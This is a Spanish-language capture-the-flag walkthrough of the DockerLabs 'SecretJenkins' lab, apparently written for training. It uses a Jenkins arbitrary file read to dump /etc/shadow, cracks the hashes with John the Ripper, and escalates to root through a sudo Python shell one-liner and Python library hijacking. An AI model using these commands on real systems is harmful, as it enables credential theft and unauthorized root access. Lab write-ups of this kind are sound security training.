## Introducción

Este documento presenta la resolución completa de la máquina **SecretJenkins**, desarrollada por *El Pingüino de Mario* para la plataforma **DockerLabs**, clasificada con una dificultad **Fácil**.
El laboratorio expone una instancia de Jenkins en el puerto 8080 con una versión vulnerable a **lectura arbitraria de archivos**. Esta vulnerabilidad permite leer `/etc/passwd` y `/etc/shadow`, extrayendo hashes de contraseñas que son crackeados con John the Ripper para obtener acceso SSH como el usuario `bobby`.
Una vez dentro, se utiliza `sudo` para ejecutar Python como el usuario `pinguinito`, y desde allí se abusa de un script ejecutado por root mediante **Library Hijacking** para obtener acceso completo como `root`.
Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.

## Paso 0 — Despliegue y preparación

Se descomprime la máquina y se despliega utilizando el script proporcionado:

```bash
unzip SecretJenkins.zip
sudo bash auto_deplo.sh SecretJenkins.tar
```

Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.

![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1748411786/ipScan_skcisu.png)

Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:

```bash
mkdir -p SecretJenkins/{content,exploits,nmap,scripts}
cd SecretJenkins
```

## Paso 1 — Reconocimiento

### 1.1 Escaneo de puertos

Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts
```

El resultado muestra los siguientes servicios accesibles externamente:

* **22/tcp** — SSH
* **8080/tcp** — HTTP (Jenkins)

## Paso 2 — Explotación (Acceso inicial)

### 2.1 Lectura arbitraria de archivos

Se localiza el exploit correspondiente para la versión de Jenkins:

```bash
searchsploit jenkins 2.441
```

![Search Exploit](https://res.cloudinary.com/dewqswzke/image/upload/v1752123374/Searchexploit_ohjmtp.png)

Se ejecuta el exploit para leer `/etc/passwd`:

![Passwd](https://res.cloudinary.com/dewqswzke/image/upload/v1752123372/Passwd_t99frp.png)

Se identifican los usuarios **bobby** y **pinguinito**.

### 2.2 Crackeo de hash de contraseña

Se lee `/etc/shadow` y se copia su contenido. Se usa `unshadow` para generar un archivo crackeable:

```bash
unshadow passwd.txt shadow.txt > hash.txt
```

![Unshadow](https://res.cloudinary.com/dewqswzke/image/upload/v1752123371/Hash_zlnzva.png)

Se crackea el hash con John the Ripper:

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

![John](https://res.cloudinary.com/dewqswzke/image/upload/v1752123372/John_jjblmv.png)

### 2.3 Acceso SSH

Se obtiene la contraseña para el usuario `bobby` y se accede vía SSH:

```bash
ssh bobby@172.17.0.2
```

![SSH](https://res.cloudinary.com/dewqswzke/image/upload/v1752123375/Ssh_iqoy7r.png)

## Paso 3 — Escalada de privilegios

### 3.1 De bobby → pinguinito

Se verifican los permisos sudo:

```bash
sudo -l
```

![Sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1752123375/Sudo-l_tvp9tq.png)

Se puede ejecutar `python3` como `pinguinito` sin contraseña:

```bash
sudo -u pinguinito python3 -c 'import os; os.system("/bin/sh")'
```

![Pinguinito](https://res.cloudinary.com/dewqswzke/image/upload/v1752123372/Pinguinito_e0yu15.png)

### 3.2 De pinguinito → root

Se verifican los permisos sudo de `pinguinito`:

```bash
sudo -l
```

Se puede ejecutar `/opt/script.py` como root. No se tiene permiso de escritura sobre el script, por lo que se utiliza **Library Hijacking**.

Se inspecciona el script para identificar librerías importadas:

![Library](https://res.cloudinary.com/dewqswzke/image/upload/v1752123372/Libary_keygn7.png)

Se crea una librería falsa con el mismo nombre que una importada y se coloca en el mismo directorio:

```python
# /opt/fake_library.py
import os
os.system("/bin/bash")
```

Se ejecuta el script con `sudo`:

```bash
sudo python3 /opt/script.py
```

![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1752123373/Root_fpvm2c.png)
